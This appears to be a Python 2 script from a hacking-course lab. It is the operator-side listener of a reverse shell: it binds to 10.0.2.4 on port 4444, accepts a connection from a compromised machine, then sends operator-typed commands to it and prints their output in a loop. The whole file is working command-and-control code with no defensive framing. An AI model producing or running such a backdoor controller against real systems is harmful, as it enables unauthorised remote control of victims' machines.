#!/usr/bin/env python

import socket

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #allows socket to be reused in case connection drops
        # listener.bind(("10.0.2.4", 4444))
        listener.bind((ip,port))

        listener.listen(0) #backlog for how many connections to allow before stopping
        print("[+] Waiting for incoming connections. . .\n")
        self.connection, address = listener.accept()
        print("[+] Connection established with " + str(address))


    def execute_remotely(self, command):
        self.connection.send(command)
        return self.connection.recv(2048).decode()

    def run(self):
        while True:
            command = raw_input(">> ")
            result = self.execute_remotely(command)
            print(result)

my_Listener = Listener("10.0.2.4", 4444)
my_Listener.run()
